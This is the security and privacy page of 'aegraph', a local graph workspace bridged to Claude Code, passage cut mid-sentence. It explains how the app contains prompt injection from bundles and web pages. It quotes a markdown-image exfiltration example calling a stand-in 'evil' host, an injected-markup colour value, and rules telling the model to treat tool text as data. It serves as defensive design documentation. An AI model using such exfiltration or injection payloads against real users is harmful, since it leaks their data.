# Security and privacy

aegraph is built so that **your data stays where you put it**. This page says
exactly what that means: what never leaves the machine, what does and when,
what protects the repository from your own data, and how to lock the whole
thing down for an organisation that requires it.

Found a vulnerability? Open a private security advisory on this repository
(its *Security* tab › *Report a vulnerability*) rather than an issue. Please say what you did, what happened, and what an attacker
would get; a proof of concept against a local clone is welcome, and please do
not test against a deployment that is not yours.

aegraph is Apache-2.0 and offered as-is: there is no support commitment and no
paid tier behind these promises. What is written here is what the code does, and
CI keeps it honest — but if you are shipping this to your own users, the last
section is for you.

**Two ways it is run, one threat model.** Most people run aegraph on their own
machine: `npm run dev`, connected to Claude Code over MCP, as a working
environment. That machine holds the developer's repositories, keys and shell,
so the question this page answers first is **what can a file someone sent you
make happen there?** A bundle, a demo, a dataset, a document, a web page a
tool fetched — all of it is somebody else's text. The answer this page
commits to: it can fill your workspace, and it can ask you things; it cannot
run code outside a sandbox, reach your files or your shell, reach this
machine's network, or send your data anywhere without a question naming the
host. Each place that holds that line is named below, with its test. A
deployed copy is a static site — no accounts, no functions, nothing on the
server but files — and is covered where it differs.

## Where your data lives

A workspace is entities in the browser's **IndexedDB**, per origin. Nothing
about it is uploaded: there is no aegraph account, no server-side store, no
telemetry and no analytics — the repository has no analytics SDK in it at all,
which `package.json` will confirm.

A project leaves the browser only when you ask it to, and only to a place you
name:

| What you do | Where it goes |
| --- | --- |
| **Save** a project | a bundle (`.ae.json` / `.aeb`) in your Downloads, or in the projects folder you picked |
| **Publish** a project | one self-contained `.html` file on your disk — read-only, no server, no upload |
| **Export** a chart, a dataset, a scene | a file on your disk |

The projects folder is one you choose yourself (File System Access API, Chrome
and Edge). The picker opens in Documents. **A clone of this repository is
refused**: pick one, and the app says why and remembers nothing — see below.

## Keeping your data out of the repository

Your projects are yours; the repository is the project's. They are kept apart
at four points, each independent of the others, because a guard that can be
forgotten is not a guard. The last one matters most: once a branch is pushed,
a pull request makes its files public, and deleting them afterwards does not
unpublish them.

1. **The app will not write there.** The projects folder is checked when you
   pick it and again before every save: a folder holding `.githooks`, a
   `package.json` naming aegraph, or a `.git` is a source checkout, and is
   refused with a sentence saying why (`checkoutKind` in
   `src/features/projects/folder.ts`). A folder that becomes a repository after
   you chose it is dropped at the next save, which falls back to Downloads.
   This is the layer that stops the file existing in the tree at all — the
   three below stop one that got there another way.
2. **`.gitignore` refuses by shape, not by name.** Every form the app writes —
   `*.ae.json`, `*.aeb`, `*.aegraph.json`, their gzipped forms, published
   `.html`, exported `.csv`/`.svg`/`.png`, anything in `public/datasets/`, any
   ChatGPT-derived file, every `.env` but `.env.example` — and every key or
   certificate (`*.pem`, `*.key`, `*.p12`, `*.pfx`, `id_rsa*` and its kin,
   `*service-account*.json`) is ignored wherever it sits in the tree. The
   handful of datasets this repository really ships are then allowed back one
   by one, by exact path.
3. **`.githooks/pre-commit` refuses at commit time**, so a file forced past
   `.gitignore` with `git add -f` is still stopped, along with anything over
   5 MB.
4. **`.githooks/pre-push` refuses at push time** — the same rules, read over
   every commit you are about to send, merges and a branch's first commit
   included (a remote tip it has never seen means every commit no remote
   branch already carries), so a commit made with `--no-verify` is stopped
   while the data is still only yours. It names the commits to fix and how.
   Both hooks read file names unquoted and NUL-separated, so a name with a
   space or a non-ASCII character is judged like any other.

`npm install` installs both hooks (`package.json` › `prepare` runs
`scripts/hooks.mjs`, which points `core.hooksPath` at `.githooks`), so a fresh
clone is protected before its first commit. `npm run hooks` re-runs the
install; `git config --get core.hooksPath` should print `.githooks`.

What counts as data, and which files this repository really ships, are written
once in **`.githooks/data-guard.sh`**; both hooks and both CI checks read it,
and `scripts/__tests__/data-guard.test.ts` runs the real rules against real
paths and fails if `.gitignore` or CI drifts out of step. Adding a dataset the
project ships is a deliberate edit to `DATA_ALLOW`, `.gitignore` and the CI job
in the same commit, with a message saying why it holds nobody's data.

CI is the backstop for what is already pushed: it fails a branch whose commits
add data, and a pull request with it never merges.

`git commit --no-verify` and `git push --no-verify` skip the hooks. That is
yours to not do.

**One more reason to keep projects out of a clone:** `git clean -fdx` deletes
every ignored file in the tree. A bundle saved into a repository is ignored —
so it is exactly what that command throws away.

## What reaches the network, and when

Nothing below runs unless you open the feature that needs it. None of it
carries your entities; what each one does carry is named.

| Feature | Goes to | Carries |
| --- | --- | --- |
| Map and globe tiles, and the index's map cards | `tile.openstreetmap.org`, `server.arcgisonline.com`, `*.tile.opentopomap.org` (the terrain layer) | the area you are looking at (a card: the area its places cover), and your IP |
| The globe's night layer | `unpkg.com` (three-globe's night image) | that you chose that layer, and your IP |
| Place search, "where is…" | `nominatim.openstreetmap.org` | the place text you typed or a tool was given |
| Dropping a pin on a map (its address is looked up for the dialog) | `nominatim.openstreetmap.org` | the pin's coordinates |
| Wikipedia enrichment, a place's card on the map | `*.wikipedia.org`, and its photos from `upload.wikimedia.org` | the place or entity name being enriched |
| Search by meaning | `huggingface.co` (once, after you agree) | nothing — the model is downloaded and the text is embedded in your browser |
| Linked-data import | the endpoint you name (e.g. `dbpedia.org`) | the query you run |
| Adding or opening a YouTube video | `www.youtube.com/oembed` (the title, when you add it), `www.youtube-nocookie.com` (the player, a sandboxed frame), `i.ytimg.com` (the thumbnail) | that you added or opened that video, this site's origin (the player needs it), and your IP |
| Adding or opening a Spotify item | `open.spotify.com` (oEmbed for the title, and the player frame), `i.scdn.co` (the cover) | that you added or opened that item, and your IP |
| Spotify sign-in and library import | `accounts.spotify.com` (PKCE sign-in and token), `api.spotify.com` (the library) | your Spotify session; the bearer token is sent only to `https://api.spotify.com/v1/` |
| An embedded web page | that site, framed in its own origin, with no referrer | what any visit tells a site |
| Voice with the browser's own recogniser | Google (Chrome) or Apple (Safari), the browser's speech service | the microphone's audio while voice is on |
| A reply read in one of the browser's network voices (Chrome's Google voices, Edge's online ones) | Google or Microsoft | the text being read aloud |
| The assistant with your own key (a deployed copy) | `api.anthropic.com`, straight from your browser | the conversation, and the app context the assistant is given |
| Voice through OpenAI | `api.openai.com` — straight from your browser with your own key; locally, through the dev server's `/api/openai` with the key in `.env.local` | the microphone's audio for a command, or the text being read aloud |
| The assistant reading a page (`web_fetch`) | the host it names, once you say yes to it — from your browser when the host allows it, else (locally only) through the dev server's `/api/fetch` | the address; no cookie, credential or referrer of yours |

Running locally the assistant is Claude Code over the bridge: the Claude API is
never called from `localhost`, whatever key is present.

**To run with no third party at all**, turn off **Third-party services** in the
settings menu (the button at the foot of the sidebar). It is on by default; off,
nothing in the table above is called — the map and globe draw on plain ground,
place search, Wikipedia, linked-data import and search by meaning refuse, and
the media and web-page embeds do not load. Adding a YouTube video or a Spotify
link makes the item from the link alone (no oEmbed), and Spotify sign-in and
import refuse. No picture on another host is loaded, and none offers a click
to load it — not even a provider's thumbnail; one carried in the data
(`data:`) still shows. Voice listens and reads only with what is on the device,
or says why it cannot. A `/open?url=…` link to another site fetches nothing,
and a dropped pin's address is not looked up. It is a per-browser setting
(`aegraph:account:settings`), so for a fleet, block the hosts at the network as
well: a setting is a default, not a policy.

## The bridge

The Claude Code bridge (`mcp/server.mjs`) is a WebSocket on the loopback that
the app's tab connects to, and it is the most powerful thing here: whoever
holds it can call every tool the app has and ask for a chat turn, which spawns
`claude -p`.

**A chat turn gets the app's tools and nothing else.** The `claude -p` child
runs with `--tools ""` and every built-in tool denied by name — no shell, no
file reads or edits, no web fetch, no sub-agents — in an empty directory of its
own (not this repository), with an environment reduced to what Claude Code
needs to sign in and reach its API. The developer's settings file is not
loaded (their hooks would run per turn, their permission rules would widen it),
and the identity of the terminal session that started the bridge (session id,
project, messaging socket) is not passed on. Their `~/.claude/CLAUDE.md` and
Claude Code's auto-memory do load, as in any of their sessions. `AEGRAPH_CLAUDE_ARGS` may add a model or a
setting, never a permission: a flag that would widen one is dropped with its
values (`mcp/chat.mjs`). This is what breaks the chain a hostile page would
otherwise have: a page that reaches the bridge can start a chat turn and
answer its own permission question, so the child must have nothing worth
asking about. (Checked against a real `claude -p`: the MCP tools answer, a
shell command has nothing to run on.)

**Tool results reach Claude Code as data.** Text in the workspace may have been
written to steer a model, so every text block of a tool result — and a tab's
error message, which may quote what it was given — is wrapped in
`<untrusted_data tool="…" id="…">`, and the server's MCP instructions say
nothing inside it is an instruction (`mcp/frame.mjs`). The envelope cannot be
closed from inside: its id is 64 random bits made for that one block, and only
a closing tag with the same id ends it — the text was written before the id
existed. The tag's name is broken wherever the text spells it, as written or
dressed up to read the same: another case, NFKC-folded fullwidth or
mathematical letters, Cyrillic or Greek look-alikes, zero-width, direction or
other invisible characters, spaces or separators between its letters, HTML
character references. That holds for your own Claude Code session as much as
the chat child: the model that reads a bundle's text is the one with your
shell.

**What a tab says about itself is cleaned too.** A tab's tool list goes into
the developer's own tool list unframed, so it is a page's words in the model's
context: a name must match `[A-Za-z0-9_-]{1,64}` and not be one of the
bridge's own, a description is made plain text (no control, direction or
invisible characters, the envelope's tag broken) and capped at 32,000
characters, every description and title inside a schema the same, and a schema
past 64 KB is dropped (`cleanManifest` in `mcp/server.mjs`, over
`cleanPageText`). `aegraph_bridge_status` frames the tab addresses it reports.

**The bridge fetches nothing.** A tool result that names an image by URL is
passed on as a note saying it was not fetched; an image reaches Claude Code as
pixels only when the tab sends them. The tab fetches a remote picture itself,
for `view_image`, after the same question as any URL a tool is handed
(`approveHandedUrl`), with no credentials and no referrer, and sends PNG, JPEG,
GIF or WebP up to 5 MB; anything else is described. A request made from the
bridge would go from the developer's machine with no question asked and past
**Third-party services**.

**Calls go to the tab the bridge started with.** Any page on the loopback may
connect (below), and without a rule any of them could say it is in front, take
Claude Code's calls, put its own tool list in front of the model and answer
for the app. So without `AEGRAPH_BRIDGE_TOKEN` the first tab to connect sets
the bridge's origin (`homeOrigin`), and calls go only to tabs from that origin;
a tab from another origin is connected but never routed to, and
`aegraph_bridge_status` lists it (`notRouted`, `routedOrigin`). With the token,
every tab has shown it and every one is routed to.

**One page, one tab.** A connected page cannot answer another tab's permission
question, stop another tab's chat, or crash the process with a malformed frame;
messages are capped at 32 MiB. Chat turns are capped at three per connection,
three for all the tabs of one origin together, and six for the process — each
is a `claude` process and a bridge of its own. A turn's bridge takes a token
made for that turn and told only to the tab that asked, so no other page can be
first to connect to it (`mcp/security.test.mjs`, `mcp/server-edges.test.mjs`).

A WebSocket is not subject to the same-origin policy, so the bridge checks the
handshake's `Origin` and refuses anything that is not a page on this machine's
loopback, or the one hosted origin `AEGRAPH_HOSTED_ORIGIN` names — by default
**`https://aegraph.sh`**, this edition's own site. A page on any other site is refused with 403 before the
socket opens (`mcp/origin.test.mjs`).

- **`AEGRAPH_HOSTED_ORIGIN`** names the one site off this machine allowed to
  connect: by default `https://aegraph.sh`, where this edition is published,
  so its pages can reach the bridge of a developer running Claude Code; set it
  to your own deployment instead, or empty to trust no hosted site — only this
  machine's pages. A value that is not an http(s) origin trusts none, and says
  so. Whoever controls the trusted site can call every tool of the open
  workspace, so trust only a site you control or the published one.
- **A server cannot point the tab elsewhere.** A connected server tells the
  tab where a chat turn's own bridge came up (`probe`); the tab follows only
  a `ws://` URL on `127.0.0.1`, `localhost` or `[::1]`, so a bridge — or
  anything posing as one — cannot hand the app's tools to another host
  (`src/features/bridge/bridge.ts › loopbackBridgeUrl`,
  `__tests__/bridgeLinks.test.ts`).
- `AEGRAPH_BRIDGE_ORIGINS` **replaces** the whole list — set it to exactly the
  origins that may drive the bridge. `*` allows any origin and is for a
  throwaway machine only.
- The loopback is allowed on any port, because every worktree runs its dev
  server on a port of its own. So any other web app you run locally can
  connect. It does not get the routing: unless it is from the first tab's
  origin, Claude Code's calls never go to it and its tool list is never the one
  Claude Code sees; its label and manifest are cleaned; and the chat turns it
  can start (a `claude -p` with no built-in tools, whose only tools are the
  page's own) count against the caps above. Set `AEGRAPH_BRIDGE_ORIGINS` to your dev origin
  (or set `AEGRAPH_BRIDGE_TOKEN`) to refuse the connection itself.
- `AEGRAPH_BRIDGE_TOKEN` additionally requires a token on the connection,
  compared in constant time. Set it if anyone else can run code on the
  machine.
- A connection with no `Origin` is not a browser page (a driver, a test) and is
  allowed. Anything that can open a loopback socket without a browser can
  already run commands as you.
- The bridge binds to `127.0.0.1` and is never reachable from the network.

Do not run `mcp/drive.mjs` with
`CHROME_FLAGS=--disable-features=LocalNetworkAccessChecks` against a browser
profile you also browse with: that flag turns off Chrome's own protection for
pages reaching the loopback.

## The headless server

The headless engine (`src/headless`, `npm run headless`) runs the app's tools in
Node against one workspace file, with no browser. Over **stdio** its only client
is the process that started it — normally your own Claude Code, whose
permission prompt comes before every call. With **`--port`** it serves MCP over
HTTP on `127.0.0.1` and every request passes three checks first
(`src/headless/httpGate.ts`): the `Host` must be the loopback's own, so a
DNS-rebinding page is refused; no browser `Origin` is accepted unless
`--allow-origin` names it; and a bearer token is required —
`AEGRAPH_HEADLESS_TOKEN`, or one made at startup and printed with the
`claude mcp add` line that carries it. Over a port, tools that destroy data are
refused unless the engine was started with `--yes`.

**Files.** Paths in tool calls are written by a model, so `import_file` and
`export_file` work only under one root — the workspace's directory, or
`--root`. Symlinks are resolved before a read is judged, a write never goes
through one, and no path may pass through a name starting with a dot: the root
is often a home directory, and `.ssh`, `.aws`, `.git`, `.env` and `.zshrc` are
credentials and code the machine runs, never a workspace's data
(`src/headless/paths.ts`, `__tests__/boundary.test.ts`).

**The network.** In Node nothing keeps a URL off the loopback. The engine
installs its own `fetch` before any tool runs: GET and HEAD over http(s), to
public addresses only, checked in the connection's own lookup so a name that
resolves — or rebinds — to `127.0.0.1`, the office network or `169.254.169.254`
is refused; redirects re-checked hop by hop; bodies capped
(`src/headless/publicFetch.ts`, `__tests__/publicFetch.test.ts`). And a URL a
tool was handed — an image, a bundle, a page — is not reached at all unless the
engine was started with `--allow-network`: the question a tab would put to its
user (a confirmation of kind `fetch`) is answered by that flag, off by default,
while a confirmation of kind `change` (a delete, a replace, a rewrite) is
answered by `--yes` / `--refuse-destructive`. The developer's Claude Code
asked to run the tool, not to reach whatever host its arguments name.

**Results.** What a tool returns is the workspace's text, and the client is a
developer's Claude Code, with their shell. So the engine hands every text block
over as the bridge does — inside `<untrusted_data tool="…">`, which the text
cannot close, a tool's error message included (it may quote what it was
given) — and its MCP instructions say nothing inside is an instruction
(`src/headless/results.ts` over `mcp/frame.mjs`,
`src/headless/__tests__/results.test.ts`).

**Arguments.** Tool input, in the tab and in Node, is checked for size and
shape before any tool runs: array and string lengths, nesting depth, and
`__proto__` / `constructor` / `prototype` as a key at any depth
(`src/features/assistant/validate.ts`).

Headless file tools honor the destructive policy: pending edits cannot be
discarded by reload, imports cannot replace or overwrite existing entities,
and exports cannot overwrite a file unless destructive operations are enabled.
The create-only export uses an exclusive open rather than a check followed by
truncation. An autosave failure leaves the process alive and data marked unsaved;
`workspace_status.saveError` names the failure and `workspace_save` retries it.

## The assistant and untrusted content

Everything the assistant reads that you did not type — entity text, documents,
bundles, web pages, tool results — can carry text written to look like an
instruction. aegraph does not rely on the model to notice. The model is told
that only your messages are instructions, and the free text it is given
arrives marked as untrusted data it cannot close. But the actions such text
would want are gated in the tools themselves, whoever calls them — the panel,
Claude Code over the bridge, a headless client:

- **Reaching another host asks you.** A URL a tool was handed (`import_graph`,
  `map_import`, `project_open_bundle`, `create_image`, `view_image` — loading a
  picture is a request too, so nothing is probed, made or looked at until the
  host is agreed to) is fetched freely only from this origin. So is an address
  a tool writes where a view will load it: `create_entity` and `update_entity`
  put an address on another site in `data.src`, `url`, `image`,
  `thumbnailUrl` or `screenshotUrl` only after the same question, and refuse
  the write otherwise (`approveLoadedUrls`). Anywhere else needs Third-party services on and your yes to a
  question naming the host. A URL that is not http(s), or carries
  credentials, is refused, and so is one naming the dev server's own routes
  (`/api/*`, however it is spelt): locally `/api/fetch` reads any public
  address for the page, so a same-origin URL to it would reach any host without
  the question (`src/core/net/url.ts`,
  `features/assistant/__tests__/handedUrl.test.ts`). `web_fetch`, the
  assistant's way to read a page, asks the same question once per host for as
  long as the caller lasts — a chat across its turns, one Claude Code session
  over the bridge (`AppHost.webApprovals`), since a site is read in several
  requests — and again for an address on an allowed host whose query is past
  200 characters or whose path is past 300, which is the shape of data being
  sent out in a URL. It is GET only — a page cannot have the model post
  anything, and a URL it plants that names a new host is a new question. So is
  a redirect: `web_fetch` fetches one hop
  at a time (`redirect: 'manual'`), and a hop to a host not yet agreed to is
  asked about before anything is sent there — where the browser hides the
  target, the dev server's `/api/fetch` reports it (`features/assistant/webTools.ts`,
  `__tests__/webTools.test.ts`). What it reads comes back wrapped as untrusted
  data the page cannot close.
- **The dev server's reader is not an open proxy.** A page the browser may not
  read (most pages refuse a cross-origin read) is read for `web_fetch` by the
  dev server's `/api/fetch` (`dev/fetch.ts`), and only there: a deployed copy
  has no server, and the tool says the page cannot be read. The reader answers
  only its own page (below), GET only, public addresses only through the
  headless engine's `publicFetch` (every address a name resolves to checked in
  the connection's own lookup, every redirect hop again: no loopback, private
  network or cloud metadata endpoint), following a redirect only on the host
  it was asked for and answering any other as `redirect` for the tab to ask
  about, 3 MB of text, 20 s, no request headers
  passed through but its own user agent, and a binary response described but
  never downloaded (`dev/__tests__/fetch.test.ts`). A redirect
  is followed only to the same host *and* scheme (never https to http), and the
  tab sends the address in an `x-fetch-url` header rather than the query.
- **Pictures from elsewhere wait for a click.** An image URL is a request
  someone else chose, carrying whatever they put in it — the classic way to
  make a model leak data is to have it write `![](https://evil/?d=…)`. In the
  assistant's answers, imported chats and any Markdown the app did not write,
  and wherever a picture's address comes from data — an entity's image
  property in a table or the inspector, an image's viewer and its crops, the
  thumbnails on the image, video and audio pages, a capture saved with an
  annotation, a page's screenshot, the photos on a map card — a remote image
  is a button naming its host until you load it. For a picture from data,
  one rule decides (`components/imageGate.ts`, drawn by `components/RemoteImage.tsx` ›
  `DataImage`): carried in the data (`data:`), on this origin, or a `blob:` of
  this page, it shows; on another host it waits for a click, and with
  Third-party services off it is not loaded and offers no click. Only a
  provider's own thumbnail of a thing you added — `i.ytimg.com`, `i.scdn.co`,
  `upload.wikimedia.org` — shows at once, and only with the switch on, because
  whatever its address carries goes to that provider, not to whoever wrote the
  data. A picture you loaded shows again for that tab without asking; a reload
  asks again. A picture drawn as a CSS background goes through `cssImageUrl`,
  quoted so an address cannot end the value and start another declaration.
  What counts as remote is where the browser
  would send the request, resolved against the page — `//evil/x`, `/\evil/x`
  and `\\evil` have no scheme but are another host all the same, and a link
  written that way is handed on as the absolute URL it is
  (`lib/__tests__/markdown-images.test.ts`,
  `components/__tests__/RemoteImage.test.tsx`).
- **What is lost, or widens access, is confirmed**, with no argument that skips
  the question: turning Third-party services on or off, discarding unsaved
  changes or reverting, `project_remove`, a rewrite that drops most of a
  document, deleting a slide, block, point or chapter with text of its own (or
  a story or a deck with what hangs from it), and turning the microphone on for
  voice (asked every time, never remembered across a reload).
- **A bundle cannot overwrite your work unasked.** A bundle merges by id and a
  newer date wins, and both are the file's to write. `project_open_bundle`
  reads the bundle first, against the open's own plan (`previewBundle` in
  `core/projects/bundle.ts`): a bundle only ever replaces entities of its own
  project, so the question arises only when it names one of your projects and
  holds newer versions of its entities — then it asks with how many, three of
  their names, and in red when documents would lose most of their text
  (`features/assistant/bundleGuard.ts`).
- **Memory cannot be planted.** The assistant's memory counts as its own only
  when this browser wrote it. A memory document that arrives in a bundle is
  shown to it as someone else's notes and never obeyed, and a bundle that names
  the id of the assistant's own memory is refused outright. Every change to
  the memory is put to you with its text: a new note, forgetting more than one
  line, a rewrite, and an edit to the memory document through
  `write_document`, `edit_document` or `update_entity`.
- **A question says what it is about, and cannot be hurried.** Every label a
  confirmation names is quoted on one line, clipped, with control, direction
  and zero-width characters taken out (`quoteLabel`, `oneLineLabel` in
  `core/entity/entity.ts`), so a name cannot dress itself as the question;
  `<app_context>` quotes labels, titles and paths the same way. The question a
  tool or Claude Code asks starts on **Cancel**, its yes cannot be pressed for
  500 ms after it appears or changes (`components/ui/useArmed.ts`), and
  questions queue rather than replace one another — so a keystroke already on
  its way, or a second question swapped in under the pointer, answers nothing.

This narrows the problem; it does not remove it. A model that has read a
hostile document can still say something untrue, or pick the wrong entity to
edit. What it cannot do is reach past the tools, or through them past a
question to you.


## Data that is drawn and run

A project, a diagram, a script, a document — anything that arrives in a bundle,
a demo, an import or from the model — is **data, not code**, and the places
where data becomes something the browser executes are handled as follows.

- **A rendered diagram is drawn as an image, never as markup.** Graphviz turns
  DOT's `URL="…"` into a link and writes `fontname` into `font-family` without
  escaping it; Mermaid lets a diagram carry CSS. So the app draws every picture
  as `<img src="data:image/svg+xml,…">` (`features/diagrams/DiagramPicture.tsx`
  over `svgDataUrl`; on the Scenes page an SVG `<image>`), where it can run
  nothing, fetch nothing and restyle nothing around it. Before that,
  `src/core/diagrams/sanitizeSvg.ts` **rebuilds** it from an allow-list, tag by
  tag, with no DOM: only drawing elements (shapes, text, groups, gradients,
  markers, patterns, clips, masks, filter primitives) — `<script>`,
  `<foreignObject>`, `<image>`, `<feImage>`, the animation elements and
  anything that loads a document go with their contents; no `on…` handler,
  `src`, `srcdoc`, `ping`, `action` or `xml:base`; a link only on `<a>`
  (a fragment, a relative path, `http(s):` or `mailto:`, judged with
  references decoded), every other `href` a fragment in the picture; no
  `url(…)` but `url(#id)`, no `image-set()`, `src()` or `@import`, CSS escapes
  decoded first; `style="…"` keeps only declarations that load nothing, and a
  `<style>` is scoped to the picture's root id (custom properties only on
  `:root`); comments, processing instructions and doctypes dropped. It fails
  closed: a document it cannot read (markup left open, a doctype declaring
  entities) or one where anything executable survives is **refused** rather
  than shown. The renderers' inputs are checked first
  (`core/diagrams/renderInput.ts`): a Graphviz `fontname`, `labelfontname`,
  `stylesheet` or `<FONT FACE>` with a quote, an angle bracket or `&` in it is
  not rendered; Mermaid's `%%{init}%%` directives are stripped, an image shape
  (`img:`) — which Mermaid fetches while it lays out — and a style line that
  fetches are refused, and front matter cannot set `themeCSS`,
  `themeVariables`, fonts, `htmlLabels`, `dompurifyConfig` or the security
  level, which stays `'strict'`. The cost: a Graphviz `URL=` is not clickable
  in the preview (it is still in the source and a downloaded SVG).
  (`__tests__/sanitizeSvg.test.ts`, `__tests__/renderSafety.test.ts`, which
  runs the real renderer.)
- **A drawing frames nothing.** Excalidraw's embeddable (a web page inside a
  drawing) is kept with its link but never framed (`validateEmbeddable` in
  `src/diagram-editor/DiagramEditor.tsx`): Excalidraw's own allow-list of
  hosts ignores Third-party services, and a drawing can come from anyone.
- **Scripts** run in a sandboxed iframe with `allow-scripts` and *not*
  `allow-same-origin` — an opaque origin, so the app's storage, session and DOM
  are not reachable — under a CSP of `default-src 'none'` with only the origin's
  own files allowed. Python runs in a worker inside that frame, and its runtime
  comes from this origin only: a build that does not serve `public/pyodide`
  says to run `npm run pyodide` rather than load it from a CDN, where nothing
  is pinned or checked. A Visual frame that never reports is stopped and
  removed when its run times out, one with no page to draw on (the assistant
  checking a script) ends when its run settles, and one that loads a second
  time has navigated away, so the run is ended and the frame removed — see
  *What is still yours to weigh* for what that cannot undo. Before any script
  runs, the Visual frame's WebRTC constructors are taken away and DNS-hint
  links (`dns-prefetch`, `preconnect`, `prefetch`) removed as they arrive,
  since CSP does not govern either; that is defence in depth, and consent
  (below) is the guarantee. A filter, style, layout or constraint refuses a
  Visual script outright (`refuseVisual`). What a run
  sends back is bounded (`src/scripting/limits.ts`: 2,000 log lines and
  512 KB of log text, 64 MB of result JSON, 256 KB of a Visual script's
  remembered state, its state at most every 250 ms).
- **Nothing runs on arrival without consent.** A script in a bundle, an import
  or a template is someone else's code. The pages that run a script by
  themselves — the Scripts page after a reload, the inspector's run-on-open,
  a bundle's `?run=1` — run only code this browser has seen its owner run or
  save here: consent is the script's id and a hash of its code, kept in this
  browser's localStorage outside the keys a bundle restores
  (`features/scripts/consent.ts` › `autorunRefusal`), so a bundle can neither
  ship it nor claim it through `meta.source`, and an import that rewrites a
  script gets no consent for the new code. A Visual script never runs on
  arrival; a run that never finished (the tab hung or died under it) is not
  run again by itself; an opened bundle's route loses `run=1`
  (`withoutAutorun`). A run of a saved script with no consent — from the page,
  or the assistant's `script` tool, which passes the script's id — runs
  **untrusted**: the JavaScript context is thrown away after it, and Python's
  worker restarts.
- **One run cannot change the next.** JavaScript scripts share a QuickJS
  context per snapshot, so once the prelude is in it is locked down: every
  built-in and hidden intrinsic, the prelude's bindings and every global
  frozen, the host reading results through functions captured before any
  script ran, a run's new globals swept. Python gets a fresh namespace per run,
  copied from the prelude, a private channel (a `MessagePort` held in a
  closure), and a fresh worker after untrusted code and when the project
  changes.
- **A figure is cleaned before Plotly draws it.** A script's figure is drawn
  in the app's page, where `img-src` and `connect-src` allow any https host,
  and Plotly fetches what a figure names: `layout.images`, image traces, map
  styles, layers, sprites, glyphs and tiles, and `url()` in a `<span style>`.
  So every figure passes `sanitizeFigure` (`src/scripting/figure.ts`) on its
  way out of the sandbox and again in `PlotlyChart`, and keeps no address it
  would fetch and no markup that loads anything.
- **A constraint's JavaScript** (`rule.js`, entity or graph scope, and every
  template's code) travels in bundles and tool calls, so it never runs in the
  app's realm. It compiles into an in-process QuickJS-WASM interpreter
  (`src/core/constraints/realm.ts`) where it sees only the rule vocabulary: no
  network, no storage, no DOM, and headless no `process` or filesystem.
  Entities and helper results cross as JSON copies and `store` is read-only.
  Each run has a deadline (250 ms per entity, 5 s per graph rule) and the
  interpreter a 64 MB cap; a rule that loops or runs out fails with a message
  and the interpreter is rebuilt. (`__tests__/realm.test.ts` probes `process`,
  `fetch`, `document`, and the global reached through `Function`, indirect
  `eval` and a helper's constructor.) Constraints once compiled with
  `new Function` in the page — a bundle's constraint was code running as the
  app.
- **A constraint cannot hold the page's writes hostage.** The guard runs on
  the page's own thread before a write lands, so a write has one budget for
  all its checks, 300 ms (`WRITE_BUDGET_MS` in `core/constraints/engine.ts`):
  a rule whose turn comes after it is spent is skipped with a warning
  violation saying it was not checked, and the audit still checks it. A write
  that switches a constraint off is never judged, so a rule that rejects
  everything can always be turned off. And a constraint that arrives in a
  bundle — new, or changed from the one the Library has — comes in switched
  off, as does every constraint that follows a template the bundle brings new
  or changed (`core/constraints/quarantine.ts`); its owner reads it on the
  Ontology page and turns it on. `meta.source` decides nothing: it is the
  file's to write.
- **A colour is a colour.** Colours from data reach markup and styles (map
  pins, globe notes, the published page), so one that is anything else —
  `red"><img onerror=…>`, `red;background:url(…)` — is dropped on the way in
  and again where it is drawn (`lib/cssColor.ts`). That covers a type's
  colour (the registry, the type editor's draft, `define_entity_type`), a
  style channel's colours (`normColor`), a drawing's colours, and the node
  colours a graph import brings (kept only when `isCssColor` says so,
  `core/exchange/graph/mapping.ts`).
- **Links and frames from data are checked.** Every link or window the app
  opens from an entity's URL is http(s) only (`httpUrl` in
  `core/resources/types.tsx`). A PDF frame loads only a PDF (`pdfSrc`): the
  browser's PDF viewer cannot run in a sandboxed frame (Chrome blocks a PDF in
  one outright, whatever the `sandbox` tokens), so the URL is what is held. A
  PDF carried in the document (`data:`), a `blob:` of this page or a file on
  this origin is framed at once; one on another host is named and waits for a
  click — and for Third-party services — with a link to open it in a tab
  instead, because framing it is a request to that host carrying whatever its
  address carries (`pdfFramesAtOnce`, `documents/__tests__/pdfViewer.test.tsx`).
  A `data:application/octet-stream` PDF is framed only when its bytes begin
  `%PDF-`.
- **Data never calls the dev server's own routes.** An image, a link or a PDF
  address from data that points at this origin's `/api/…` — however it is
  spelt — is refused (`isOwnFunction` in `lib/markdown.ts`, under `safeUrl`,
  `dataImageSrc` and `pdfSrc`): locally `/api/fetch` reads any public address,
  so a same-origin URL to it would have the dev server fetch an address for
  whoever wrote the text. The dev server answers `/api/fetch`
  only to the tab's own `fetch` — the exact path, `Sec-Fetch-Dest: empty`, the
  address in the `x-fetch-url` header — never to an `<img>` or a frame
  (`localApiRoute` in `scripts/devOrigin.mjs`).
- **`/open?url=…`** is a link anyone can send. A bundle on this origin opens
  straight away; one from anywhere else names the host and **asks before
  anything is fetched**, because the bundle becomes the reader's workspace —
  and with Third-party services off it fetches nothing and says why. A URL
  that is not http(s) is refused, and the body is read within 512 MB
  (`readResponseBytes`). (`__tests__/openOrigin.test.ts`.)
- **An embedded web page** is framed only when its URL is another site's, over
  http(s), with no referrer, and only with Third-party services on. The frame
  keeps its own origin, which a real site needs, so a page on *this* origin
  would be inside the app — that is refused and shown as a link.
- **A media player is the provider's page, not the provider's script.** A
  YouTube video is a `youtube-nocookie.com/embed` frame and a Spotify item an
  `open.spotify.com/embed` frame, framed by a well-formed id only, sandboxed
  (`EMBED_SANDBOX` in `features/videos/youtube.ts`: the provider's scripts in
  the provider's origin) and driven by the embed's own messages. No script of
  YouTube's or Spotify's runs in the app's origin, where it could read your
  keys and your workspace (`features/videos/__tests__/embeds.test.ts`).
- **A published page** escapes every piece of text it writes and escapes `<`
  inside the JSON it embeds, so a label cannot close the script tag it sits in.
  It also carries its own Content-Security-Policy in a `<meta>`: its one
  script runs by hash, and it loads nothing from any host — a page opened from
  disk or someone else's server has no header to protect it, and a remote
  image in it would tell a stranger who opened it. Remote images become links.
- **Code that runs in this origin is served by it.** That includes the ONNX
  runtime behind search by meaning (`public/vendor/ort/`, copied from
  `node_modules` by `scripts/vendor.mjs`); transformers.js would otherwise
  import it from a CDN. Only model weights come from huggingface.co, after you
  agree.

## Keys and secrets

- **Your Claude / OpenAI key**, if you use one, is in this browser's
  localStorage and goes straight to the provider. It is never put in a bundle,
  a published page or a project: the state a project carries is a fixed
  allow-list (`src/core/projects/active.ts` › `PROJECT_UI_KEYS`, kept as
  strings of at most 2 million characters under `aegraph:ui:p:<id>`), and no
  key or conversation is on it. Nor is it in a **stash** (the *This browser*
  page's copy of this browser, `/browser`, `src/app/stash.ts`) unless **Include
